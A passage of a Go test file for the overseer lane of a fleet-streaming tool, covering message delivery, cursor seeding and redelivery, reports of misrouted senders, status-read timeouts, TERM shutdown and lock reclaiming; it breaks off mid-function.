package stream

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"syscall"
	"testing"
	"time"

	"github.com/noamsto/dispatcher/crew/internal/clock"
	fleetpkg "github.com/noamsto/dispatcher/crew/internal/fleet"
	"github.com/noamsto/dispatcher/crew/internal/fleet/fleettest"
	lanepkg "github.com/noamsto/dispatcher/crew/internal/lane"
	"github.com/noamsto/dispatcher/crew/internal/proc"
	"github.com/noamsto/dispatcher/crew/internal/repos"
)

const (
	ovHost = "testhost"
	ovMe   = "overseer:" + ovHost
	// ovStart is every overseer lane's start on its test clock.
	ovStart = int64(1_800_000_000_000)
	minute  = int64(60_000)
)

// msClock is a lane clock the test sets: the transition period, the misrouted
// window and the seed all read it, and nothing moves it but the test.
type msClock struct{ ms atomic.Int64 }

func newMSClock(ms int64) *msClock {
	c := &msClock{}
	c.ms.Store(ms)
	return c
}

func (c *msClock) Now() time.Time          { return time.UnixMilli(c.ms.Load()) }
func (c *msClock) advance(d time.Duration) { c.ms.Add(d.Milliseconds()) }

// ovRig is one overseer lane's surroundings: its state home, clock, the entry
// it must never re-enter, and the status documents it is fed in turn (the last
// one repeats).
type ovRig struct {
	t     *testing.T
	state string
	clock *msClock
	self  *stub
	docs  []fleetpkg.StatusDoc
	calls atomic.Int32
	flush func() error
	notes string
}

func newOvRig(t *testing.T) *ovRig {
	return &ovRig{t: t, state: t.TempDir(), clock: newMSClock(ovStart), self: entryStub(t, nil)}
}

func (r *ovRig) options(discover func(io.Writer) []repos.Repo) FleetOptions {
	return FleetOptions{
		Options:  Options{Clock: clock.Clock{Now: r.clock.Now}, Self: r.self.Script},
		Discover: discover,
		Getenv: func(k string) string {
			if k == "XDG_STATE_HOME" {
				return r.state
			}
			return ""
		},
		Host:  func() (string, error) { return ovHost, nil },
		Flush: r.flush,
		CollectStatus: func(_ context.Context, stderr io.Writer, _ func(string) (int64, bool)) fleetpkg.StatusDoc {
			n := int(r.calls.Add(1))
			if r.notes != "" {
				say(stderr, "%s", r.notes)
			}
			if len(r.docs) == 0 {
				return fleetpkg.StatusDoc{TS: r.clock.Now().UnixMilli(), Host: ovHost}
			}
			return r.docs[min(n, len(r.docs))-1]
		},
	}
}

func (r *ovRig) start(discover func(io.Writer) []repos.Repo) *fleetLane {
	r.t.Helper()
	l := startFleet(r.t, r.options(discover), FleetRequest{Overseer: true})
	r.t.Cleanup(func() {
		if r.self.has("argv.log") {
			r.t.Errorf("the overseer lane re-entered the crew entry: %q", r.self.argv())
		}
	})
	return l
}

func (r *ovRig) cursor(common string) string {
	return readFile(lanepkg.OverseerCursor(r.state, common))
}

func ovMsg(ts int64, crew, from, to, body string) string {
	return fmt.Sprintf(`{"ts":%d,"crew_id":%q,"from":%q,"to":%q,"kind":"msg","body":%q}`, ts, crew, from, to, body)
}

func ofEvent(lines []map[string]any, event string) []map[string]any {
	var out []map[string]any
	for _, l := range lines {
		if l["stream"] == "overseer" && l["event"] == event {
			out = append(out, l)
		}
	}
	return out
}

// tree lists every path under dir, relative to it.
func tree(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	err := filepath.WalkDir(dir, func(path string, _ fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if rel, _ := filepath.Rel(dir, path); rel != "." {
			out = append(out, rel)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func TestOverseerDeliversDispatcherMsgsOnceTaggedAndLeavesDispatcherCursor(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	dispatcherCursor := filepath.Join(alpha, "crew", "crews", "c1", "cursor")
	mkdir(t, filepath.Dir(dispatcherCursor))
	writeFile(t, dispatcherCursor, "1000\n")

	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart) {
		t.Fatalf("seeded cursor = %q, want the lane's start", got)
	}

	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "dispatcher:c1", ovMe, "ack 1"))
	appendRow(t, alpha, ovMsg(ovStart+2000, "c2", "dispatcher:c2", ovMe, "ack 2"))
	l.kick()
	l.kick()
	l.stop()

	batches := l.batches()
	if len(batches) != 1 {
		t.Fatalf("batches = %v, want one", batches)
	}
	if batches[0]["repo"] != "alpha" || batches[0]["cursor"] != float64(ovStart+2000) {
		t.Errorf("batch = %v, want repo alpha and cursor %d", batches[0], ovStart+2000)
	}
	if got := eventTS(batches[0]); !reflect.DeepEqual(got, []int64{ovStart + 1000, ovStart + 2000}) {
		t.Errorf("delivered %v, want both crews' msgs once", got)
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+2000) {
		t.Errorf("overseer cursor = %q", got)
	}
	if got := readFile(dispatcherCursor); got != "1000\n" {
		t.Errorf("the dispatcher's cursor changed to %q", got)
	}
	if got := tree(t, filepath.Join(alpha, "crew", "crews")); !reflect.DeepEqual(got, []string{"c1", filepath.Join("c1", "cursor")}) {
		t.Errorf("crews/ holds %v, want only the dispatcher's own cursor", got)
	}
}

func TestOverseerReportsMisroutedSenderNeverBody(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))

	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "worker:feat/a#s1-1", ovMe, "BODY-SENTINEL wake up"))
	l.kick()
	l.kick()
	l.stop()

	if out := l.out.str(); strings.Contains(out, "BODY-SENTINEL") {
		t.Errorf("a misrouted body reached stdout: %s", out)
	}
	if b := l.batches(); len(b) != 0 {
		t.Errorf("a worker's msg to the overseer was delivered: %v", b)
	}
	lines := ofEvent(l.lines(), "misrouted_msg")
	if len(lines) != 1 {
		t.Fatalf("misrouted lines = %v, want one", lines)
	}
	want := map[string]any{"stream": "overseer", "event": "misrouted_msg", "repo": "alpha", "crew": "c1", "host": ovHost,
		"from": "worker:feat/a#s1-1", "misrouted": float64(1), "ts": float64(ovStart)}
	if !reflect.DeepEqual(lines[0], want) {
		t.Errorf("misrouted line = %v, want %v", lines[0], want)
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+1000) {
		t.Errorf("cursor = %q: a misrouted msg must still move it", got)
	}
}

func TestOverseerMisroutedIsOneLinePerRepoPerInterval(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))

	post := func(from, to int) {
		for i := from; i < to; i++ {
			appendRow(t, alpha, ovMsg(ovStart+int64(i)+1, "c1", fmt.Sprintf("worker:feat/b%d#s%d-1", i, i), ovMe, "x"))
		}
	}
	post(0, 50)
	l.kick()
	if got := ofEvent(l.lines(), "misrouted_msg"); len(got) != 1 || got[0]["misrouted"] != float64(50) || got[0]["from"] != "worker:feat/b0#s0-1" {
		t.Fatalf("fifty senders in one poll = %v, want one line with misrouted 50 naming the first", got)
	}

	// --interval defaults to 60 s in overseer mode: 59 s on, the window is still shut.
	r.clock.advance(59 * time.Second)
	post(50, 53)
	l.kick()
	if got := ofEvent(l.lines(), "misrouted_msg"); len(got) != 1 {
		t.Fatalf("misrouted lines inside the window = %v, want still one", got)
	}
	r.clock.advance(time.Second)
	post(53, 54)
	l.kick()
	l.stop()
	got := ofEvent(l.lines(), "misrouted_msg")
	if len(got) != 2 || got[1]["misrouted"] != float64(54) || got[1]["from"] != "worker:feat/b53#s53-1" {
		t.Errorf("after the window = %v, want a second line with the running count 54", got)
	}
}

func TestOverseerRedeliversWhenFlushFails(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	var atFlush []string
	r.flush = func() error {
		atFlush = append(atFlush, r.cursor(alpha))
		return errors.New("stdout closed")
	}
	first := r.start(okRepos(alpha))
	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "dispatcher:c1", ovMe, "ack"))
	first.kick()
	first.stop()

	seed := fmt.Sprintf("%d\n", ovStart)
	if len(atFlush) == 0 || atFlush[0] != seed {
		t.Fatalf("cursor at flush = %q, want the seed %q still in place", atFlush, seed)
	}
	if got := r.cursor(alpha); got != seed {
		t.Fatalf("cursor after a failed flush = %q, want %q", got, seed)
	}
	if got := first.delivered()["alpha"][ovStart+1000]; got == 0 {
		t.Fatalf("the batch was never printed: %q", first.out.str())
	}

	// The next lane is the restart after a kill between flush and cursor write.
	r.flush = nil
	r.clock.advance(time.Minute)
	second := r.start(okRepos(alpha))
	second.stop()
	if got := second.delivered()["alpha"][ovStart+1000]; got != 1 {
		t.Errorf("the restarted lane delivered the msg %d times, want once: %q", got, second.out.str())
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+1000) {
		t.Errorf("cursor = %q after the redelivery", got)
	}
}

// A flush that failed leaves the log's stat unrecorded: the next poll of the
// same lane delivers the batch again though the log did not change.
func TestOverseerPollsAnUnchangedLogAgainAfterAFailedFlush(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	failed := false
	r.flush = func() error {
		if failed {
			return nil
		}
		failed = true
		return errors.New("stdout closed")
	}
	l := r.start(okRepos(alpha))
	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "dispatcher:c1", ovMe, "ack"))
	l.kick()
	seed := fmt.Sprintf("%d\n", ovStart)
	if got := r.cursor(alpha); got != seed {
		t.Fatalf("cursor after a failed flush = %q, want %q", got, seed)
	}
	l.kick()
	l.kick()
	l.stop()
	if got := l.delivered()["alpha"][ovStart+1000]; got != 2 {
		t.Errorf("the msg was printed %d times, want twice (the failed flush, then the retry): %q", got, l.out.str())
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+1000) {
		t.Errorf("cursor = %q after the retry", got)
	}
}

// A log whose size and mtime are those of the last completed poll is not read.
func TestOverseerSkipsAnUnchangedLog(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	log := filepath.Join(alpha, "crew", "events.jsonl")
	appendRow(t, alpha, ovMsg(ovStart-1000, "c1", "dispatcher:c1", ovMe, "old"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	before, err := os.Stat(log)
	if err != nil {
		t.Fatal(err)
	}
	// Same size and mtime, a msg the lane has not seen: only a read finds it.
	if err := os.WriteFile(log, []byte(strings.Replace(readFile(log), fmt.Sprint(ovStart-1000), fmt.Sprint(ovStart+1000), 1)), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(log, before.ModTime(), before.ModTime()); err != nil {
		t.Fatal(err)
	}
	l.kick()
	if out := l.out.str(); out != "" {
		t.Fatalf("stdout = %q, want nothing: the log's stat was unchanged", out)
	}
	appendRow(t, alpha, ovMsg(ovStart+2000, "c1", "dispatcher:c1", ovMe, "new"))
	l.kick()
	l.stop()
	if got := l.delivered()["alpha"]; got[ovStart+1000] != 1 || got[ovStart+2000] != 1 {
		t.Errorf("delivered %v, want both once after the log changed", got)
	}
}

// Production leaves Flush nil, so the write's own error is the only guard: a
// batch that did not reach stdout leaves the cursor where it was.
func TestOverseerRedeliversWhenTheBatchWriteFails(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	var failed atomic.Bool
	l.out.failWhen(func(p []byte) bool {
		return bytes.Contains(p, []byte(`"events":`)) && failed.CompareAndSwap(false, true)
	})
	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "dispatcher:c1", ovMe, "ack"))
	l.kick()
	seed := fmt.Sprintf("%d\n", ovStart)
	if !failed.Load() || r.cursor(alpha) != seed {
		t.Fatalf("cursor after a failed write = %q (write failed: %v), want the seed %q", r.cursor(alpha), failed.Load(), seed)
	}
	l.kick()
	l.stop()
	if got := l.delivered()["alpha"][ovStart+1000]; got != 1 {
		t.Errorf("the msg reached stdout %d times, want once on the retry: %q", got, l.out.str())
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+1000) {
		t.Errorf("cursor = %q after the retry", got)
	}
}

// A log the fold cannot read is an error line, and its stat stays unrecorded:
// mended in place, at the same size and mtime, it is folded on the next poll.
func TestOverseerRetriesALogItCannotFold(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	log := filepath.Join(alpha, "crew", "events.jsonl")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	appendRow(t, alpha, ovMsg(ovStart+1000, "c1", "dispatcher:c1", ovMe, "ack"))
	f, err := os.OpenFile(log, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString("{not json}\n"); err != nil {
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	l.kick()
	l.kick()
	var errs []map[string]any
	for _, line := range l.lines() {
		if line["stream"] == "error" {
			errs = append(errs, line)
		}
	}
	if len(errs) != 1 || errs[0]["repo"] != "alpha" || errs[0]["crew"] != ovMe || !strings.HasPrefix(errs[0]["detail"].(string), "fold: ") {
		t.Fatalf("error lines = %v, want one fold: line for alpha", errs)
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart) {
		t.Fatalf("cursor = %q after a failed fold, want the seed", got)
	}

	before, err := os.Stat(log)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(log, []byte(strings.Replace(readFile(log), "{not json}", "          ", 1)), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(log, before.ModTime(), before.ModTime()); err != nil {
		t.Fatal(err)
	}
	l.kick()
	l.stop()
	if got := l.delivered()["alpha"][ovStart+1000]; got != 1 {
		t.Errorf("the msg was delivered %d times once the log was mended, want once: %q", got, l.out.str())
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart+1000) {
		t.Errorf("cursor = %q after the mended fold", got)
	}
}

// TERM cuts a hung status read short, and the document it returns then is
// dropped: built under a cancelled context, it may read a failed probe as a
// cleared condition.
func TestOverseerStopsOnTermDuringAHungStatusRead(t *testing.T) {
	r := newOvRig(t)
	o := r.options(okRepos())
	w := ovWorker("worker:feat/a#s1-1", "working")
	entered := make(chan struct{}, 1)
	calls := 0
	o.CollectStatus = func(ctx context.Context, _ io.Writer, _ func(string) (int64, bool)) fleetpkg.StatusDoc {
		if calls++; calls == 1 {
			return ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w)))
		}
		entered <- struct{}{}
		<-ctx.Done()
		return ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w)))
	}
	l := startFleet(t, o, FleetRequest{Overseer: true})
	r.clock.advance(time.Minute)
	select {
	case l.tick <- time.Now():
	case <-time.After(10 * time.Second):
		t.Fatal("the lane never took the tick")
	}
	select {
	case <-entered:
	case <-time.After(10 * time.Second):
		t.Fatal("the second status read never started")
	}
	start := time.Now()
	if rc := l.stop(); rc != 0 {
		t.Errorf("exit = %d, want 0; stderr %q", rc, l.errb.str())
	}
	if took := time.Since(start); took > 5*time.Second {
		t.Errorf("the lane took %s to stop on TERM", took)
	}
	if got := ofEvent(l.lines(), "dispatcher_down"); len(got) != 0 {
		t.Errorf("a cancelled status read woke the overseer: %v", got)
	}
	for _, line := range l.lines() {
		if line["stream"] == "error" {
			t.Errorf("a status read TERM cut short printed an error line: %v", line)
		}
	}
}

// bareOverseer is an overseer with only what diff reads: its clock stands at
// ovStart, and collect is its status read.
func bareOverseer(out io.Writer, collect func(context.Context, io.Writer, func(string) (int64, bool)) fleetpkg.StatusDoc) *overseer {
	return &overseer{
		c:        call{crew: ovMe, heartbeat: defaultHeartbeat},
		o:        FleetOptions{Options: Options{Clock: clock.Clock{Now: newMSClock(ovStart).Now}}},
		out:      &laneWriter{w: out, now: time.Now},
		notes:    newNotes(io.Discard),
		sup:      &suppress{key: map[string]string{}, ts: map[string]int64{}},
		moves:    newTransitions(),
		partners: map[string]*partner{},
		inboxes:  map[string]lanepkg.FarInbox{},
		collect:  collect,
	}
}

// A status read gets its timeout at most. The document it returns past that is
// dropped with one error line per --heartbeat, and the next one in time still
// fires; a read that completes re-arms the error line.
func TestOverseerDiffDropsADocumentPastItsTimeout(t *testing.T) {
	var out lockedWriter
	w := ovWorker("worker:feat/a#s1-1", "working")
	hang := true
	v := bareOverseer(&out, func(ctx context.Context, _ io.Writer, _ func(string) (int64, bool)) fleetpkg.StatusDoc {
		if hang {
			<-ctx.Done()
		}
		return ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w)))
	})
	v.timeout = 10 * time.Millisecond
	v.moves.next(ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w))), ovStart)
	v.diff(t.Context())
	want := map[string]any{"stream": "error", "crew": ovMe, "rc": float64(1),
		"detail": "status: no document within 10ms", "ts": float64(ovStart)}
	if got := decodeLinesT(t, out.str()); len(got) != 1 || !reflect.DeepEqual(got[0], want) {
		t.Fatalf("a timed-out status read printed %v, want [%v]", got, want)
	}
	v.diff(t.Context())
	if got := decodeLinesT(t, out.str()); len(got) != 1 {
		t.Fatalf("a second timed-out read within --heartbeat printed again: %q", out.str())
	}

	hang = false
	v.timeout = time.Minute
	v.diff(t.Context())
	if got := ofEvent(decodeLinesT(t, out.str()), "dispatcher_down"); len(got) != 1 {
		t.Errorf("the next read in time = %v, want one dispatcher_down", got)
	}
	hang = true
	v.timeout = 10 * time.Millisecond
	v.diff(t.Context())
	var errs int
	for _, line := range decodeLinesT(t, out.str()) {
		if line["stream"] == "error" {
			errs++
		}
	}
	if errs != 2 {
		t.Errorf("a timed-out read after a completed one gave %d error lines in all, want 2: %q", errs, out.str())
	}
}

// --interval paces the diffs, never a read's deadline: at --interval 1 a read
// slower than a second still completes.
func TestOverseerStatusDeadlineIsNotTheInterval(t *testing.T) {
	r := newOvRig(t)
	o := r.options(okRepos())
	left := make(chan time.Duration, 1)
	o.CollectStatus = func(ctx context.Context, _ io.Writer, _ func(string) (int64, bool)) fleetpkg.StatusDoc {
		deadline, _ := ctx.Deadline()
		select {
		case left <- time.Until(deadline):
		default:
		}
		return ovDoc(ovStart)
	}
	startFleet(t, o, FleetRequest{Request: Request{Interval: "1"}, Overseer: true})
	select {
	case got := <-left:
		if got <= 10*time.Second {
			t.Errorf("a status read at --interval 1 had %s left, want more than 10s", got)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the lane never read the status")
	}
}

// A read past its timeout is no baseline: the first that completes is, and it
// wakes nothing whatever it holds.
func TestOverseerFirstCompletedReadIsTheBaseline(t *testing.T) {
	var out lockedWriter
	w := ovWorker("worker:feat/a#s1-1", "working")
	hang := true
	v := bareOverseer(&out, func(ctx context.Context, _ io.Writer, _ func(string) (int64, bool)) fleetpkg.StatusDoc {
		if hang {
			<-ctx.Done()
			return ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w)))
		}
		return ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w)))
	})
	v.timeout = 10 * time.Millisecond
	v.diff(t.Context())
	hang = false
	v.timeout = time.Minute
	v.diff(t.Context())
	for _, line := range decodeLinesT(t, out.str()) {
		if line["stream"] == "overseer" {
			t.Errorf("the first completed read woke the overseer: %v", line)
		}
	}
}

func TestOverseerSeedsMissingCursorAtStart(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, ovMsg(ovStart-1000, "c1", "dispatcher:c1", ovMe, "before the lane"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart) {
		t.Fatalf("cursor = %q, want the lane's start %d", got, ovStart)
	}
	appendRow(t, alpha, ovMsg(ovStart+500, "c1", "dispatcher:c1", ovMe, "after"))
	l.kick()
	l.stop()
	d := l.delivered()["alpha"]
	if d[ovStart-1000] != 0 || d[ovStart+500] != 1 {
		t.Errorf("delivered %v, want only the msg after the start", d)
	}
}

// Status rows and msgs to anyone else never wake the overseer: they are each
// crew's dispatcher's wakes, or sinks nobody waits on.
func TestOverseerIgnoresOtherRecipientsAndStatusRows(t *testing.T) {
	alpha := gitRepo(t, "alpha")
	appendRow(t, alpha, statusRow(1000, "c1", "worker:feat/a", "working"))
	r := newOvRig(t)
	l := r.start(okRepos(alpha))
	ts := ovStart
	for _, state := range []string{"working", "blocked", "pr_open", "done", "failed", "exited"} {
		ts++
		appendRow(t, alpha, statusRow(ts, "c1", "worker:feat/a", state))
	}
	for _, to := range []string{"dispatcher:c1", "worker:feat/a", "role:feat/a:reviewer", "metrics:c1", "retro:c1", "review:c1", "hold:c1", "*"} {
		ts++
		appendRow(t, alpha, ovMsg(ts, "c1", "dispatcher:c1", to, "x"))
	}
	l.kick()
	l.stop()
	if out := l.out.str(); out != "" {
		t.Errorf("stdout = %q, want nothing", out)
	}
	if got := r.cursor(alpha); got != fmt.Sprintf("%d\n", ovStart) {
		t.Errorf("cursor = %q, want the seed untouched", got)
	}
}

func TestOverseerLaneDiffsInjectedStatusEveryInterval(t *testing.T) {
	r := newOvRig(t)
	r.notes = "crew: fleet status: /gone/.git: skipped\n"
	r.docs = []fleetpkg.StatusDoc{
		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", ovWorker("worker:feat/a#s1-1", "working")))),
		ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", ovWorker("worker:feat/a#s1-1", "working")))),
	}
	l := r.start(okRepos())
	if n := r.calls.Load(); n != 1 {
		t.Fatalf("status computed %d times at start, want the baseline once", n)
	}
	l.kick()
	if n := r.calls.Load(); n != 1 {
		t.Fatalf("status computed %d times before --interval passed", n)
	}
	r.clock.advance(time.Minute)
	l.kick()
	l.kick()
	l.stop()
	got := ofEvent(l.lines(), "dispatcher_down")
	want := map[string]any{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1", "host": ovHost,
		"state": "dead", "ts": float64(ovStart + minute)}
	if len(got) != 1 || !reflect.DeepEqual(got[0], want) {
		t.Errorf("dispatcher_down lines = %v, want [%v]", got, want)
	}
	if n := strings.Count(l.errb.str(), r.notes); n != 1 {
		t.Errorf("status note said %d times, want once: %q", n, l.errb.str())
	}
}

func TestOverseerAndCrewAreExclusive(t *testing.T) {
	var out, errb bytes.Buffer
	r := newOvRig(t)
	rc := RunFleet(FleetRequest{Request: Request{Crew: "c1"}, Overseer: true}, &out, &errb, r.options(okRepos()))
	if rc != exitUsage || errb.String() != "crew: fleet stream: --overseer and --crew are exclusive\n" || out.Len() != 0 {
		t.Errorf("rc %d stdout %q stderr %q", rc, out.String(), errb.String())
	}
}

func TestOverseerHostFailureIsOneLine(t *testing.T) {
	var out, errb bytes.Buffer
	r := newOvRig(t)
	o := r.options(okRepos())
	o.LaneRoot = t.TempDir()
	o.Host = func() (string, error) { return "", errors.New("self name \"x y\"\nis not valid") }
	rc := RunFleet(FleetRequest{Overseer: true}, &out, &errb, o)
	if rc != exitUsage || errb.String() != "crew: fleet stream: host name: self name \"x y\" is not valid\n" || out.Len() != 0 {
		t.Errorf("rc %d stdout %q stderr %q", rc, out.String(), errb.String())
	}
}

func TestOverseerStatusAndForce(t *testing.T) {
	root := t.TempDir()
	r := newOvRig(t)
	runStatus := func(tbl proc.Table) (int, map[string]any) {
		t.Helper()
		var out, errb bytes.Buffer
		o := r.options(okRepos())
		o.LaneRoot = root
		o.Proc = tbl
		rc := RunFleet(FleetRequest{Request: Request{Status: true}, Overseer: true}, &out, &errb, o)
		lines := decodeLinesT(t, out.String())
		if len(lines) != 1 {
			t.Fatalf("--status printed %q, stderr %q", out.String(), errb.String())
		}
		return rc, lines[0]
	}
	if rc, line := runStatus(alive()); rc != 2 || line["state"] != "dead" || line["crew"] != ovMe {
		t.Errorf("missing lane = (%d, %v), want (2, dead, %s)", rc, line, ovMe)
	}

	lane := filepath.Join(root, ovMe)
	lockd := mkdir(t, filepath.Join(lane, "stream.lock.d"))
	holder := exec.Command("sleep", "60")
	if err := holder.Start(); err != nil {
		t.Fatal(err)
	}
	exited := make(chan struct{})
	go func() { _ = holder.Wait(); close(exited) }()
	t.Cleanup(func() { _ = holder.Process.Kill() })
	writeFile(t, filepath.Join(lockd, "pid"), fmt.Sprintf("%d\n", holder.Process.Pid))
	writeFile(t, filepath.Join(lane, "stream.tick"), fmt.Sprintf(`{"pid":%d,"ts":1,"park":300}`, holder.Process.Pid))
	if rc, line := runStatus(alive(fmt.Sprint(holder.Process.Pid))); rc != 1 || line["state"] != "stale" {
		t.Fatalf("stale lane = (%d, %v), want (1, stale)", rc, line)
	}

	var out, errb lockedWriter
	done := make(chan int, 1)
	o := r.options(okRepos())
	o.LaneRoot = root
	go func() {
		done <- RunFleet(FleetRequest{Request: Request{Force: true}, Overseer: true}, &out, &errb, o)
	}()
	me := fmt.Sprint(os.Getpid())
	waitFor(t, "the reclaimed lane's tick", func() bool {
		return strings.Contains(readFile(filepath.Join(lane, "stream.tick")), `"pid":`+me)
	})
	select {
	case <-exited:
	case <-time.After(10 * time.Second):
		t.Error("--force never stopped the stale holder")
	}
	if got := strings.TrimSpace(readFile(filepath.Join(lockd, "pid"))); got != me {
		t.Errorf("lock holder = %q, want this process %s", got, me)
	}
	if err := syscall.Kill(os.Getpid(), syscall.SIGTERM); err != nil {
		t.Fatal(err)
	}
	select {
	case rc := <-done:
		if rc != 0 {
			t.Errorf("exit = %d, want 0; stderr %q", rc, errb.str())
		}
	case <-time.After(20 * time.Second):
		t.Fatal("the reclaimed lane did not stop on TERM")
	}
	if _, err := os.Stat(lockd); !os.IsNotExist(err) {
		t.Errorf("the lane lock survived the shutdown (%v)", err)
	}
}

func TestSenderTextKeepsOnlyTheSenderCharset(t *testing.T) {
	for in, want := range map[string]string{
		"worker:feat/x#s1-1":     "worker:feat/x#s1-1",
		"dispatcher:a.b_c@h":     "dispatcher:a.b_c@h",
		"worker:x \"y\"\n\u2603": "worker:x??y???",
		"\xff":                   "?",
		strings.Repeat("a", 200): strings.Repeat("a", 120),
		strings.Repeat("é", 200): strings.Repeat("?", 120),
	} {
		if got := senderText(in); got != want {
			t.Errorf("senderText(%q) = %q, want %q", in, got, want)
		}
	}
}

// The transition differ, driven directly: conditions read the document's own
// ts, so successive documents are the clock.

func ovDoc(ts int64, rs ...fleetpkg.RepoStatus) fleetpkg.StatusDoc {
	return fleetpkg.StatusDoc{TS: ts, Host: ovHost, Queue: fleetpkg.QueueStatus{Demoted: []fleetpkg.QueueDemote{}, Parked: []fleetpkg.QueueParked{}}, Repos: rs}
}

func ovRepo(name string, crews ...fleetpkg.CrewStatus) fleetpkg.RepoStatus {
	return fleetpkg.RepoStatus{Repo: "o/" + name, Common: "/git/" + name + "/.git", Key: "/git/" + name + "/.git", Crews: crews}
}

func ovCrew(id, state, attention string, workers ...map[string]any) fleetpkg.CrewStatus {
	return fleetpkg.CrewStatus{CrewID: id, Dispatcher: fleetpkg.Dispatcher{State: state}, Attention: attention, Workers: workers}
}

func withLane(c fleetpkg.CrewStatus, lane string) fleetpkg.CrewStatus {
	c.Dispatcher.Lane = &lane
	return c
}

func ovWorker(from, state string) map[string]any {
	branch, _, _ := strings.Cut(strings.TrimPrefix(from, "worker:"), "#")
	return map[string]any{"from": from, "branch": branch, "state": state, "stale": false, "blocked": nil}
}

// blockedWorker is a blocked row as CollectStatus derives it: since an int64,
// budget_left_s an int or nil.
func blockedWorker(from string, since int64, budget any, source string, answered bool) map[string]any {
	w := ovWorker(from, "blocked")
	w["source"] = source
	w["blocked"] = map[string]any{"since": since, "cycle": nil, "budget_left_s": budget, "source": source, "answered": answered}
	return w
}

func withQueue(d fleetpkg.StatusDoc, q fleetpkg.QueueStatus, budget, weight int) fleetpkg.StatusDoc {
	if q.Demoted == nil {
		q.Demoted = []fleetpkg.QueueDemote{}
	}
	if q.Parked == nil {
		q.Parked = []fleetpkg.QueueParked{}
	}
	d.Queue = q
	d.Machine = &fleetpkg.LoadDoc{Budget: budget, Weight: weight}
	return d
}

// step is one evaluation, its lines decoded as a reader sees them.
func step(t *testing.T, tr *transitions, d fleetpkg.StatusDoc) []map[string]any {
	t.Helper()
	var out []map[string]any
	for _, line := range tr.next(d, d.TS+1) {
		var m map[string]any
		if err := json.Unmarshal([]byte(encode(line)), &m); err != nil {
			t.Fatalf("line %v: %v", line, err)
		}
		out = append(out, m)
	}
	return out
}

// steps runs each document in turn and returns each one's events by name.
func steps(t *testing.T, docs ...fleetpkg.StatusDoc) [][]string {
	t.Helper()
	tr := newTransitions()
	var out [][]string
	for _, d := range docs {
		var names []string
		for _, l := range step(t, tr, d) {
			names = append(names, l["event"].(string))
		}
		out = append(out, names)
	}
	return out
}

func wantSteps(t *testing.T, got [][]string, want ...[]string) {
	t.Helper()
	norm := func(v [][]string) string { return fmt.Sprint(v) }
	if norm(got) != norm(want) {
		t.Errorf("events per document = %v, want %v", got, want)
	}
}

func none() []string               { return nil }
func evs(names ...string) []string { return names }

func TestTransitionsBaselineEmitsNothing(t *testing.T) {
	alarming := withQueue(ovDoc(ovStart+time.Hour.Milliseconds(),
		ovRepo("alpha",
			ovCrew("c1", "dead", "unattended", ovWorker("worker:feat/a#s1-1", "working")),
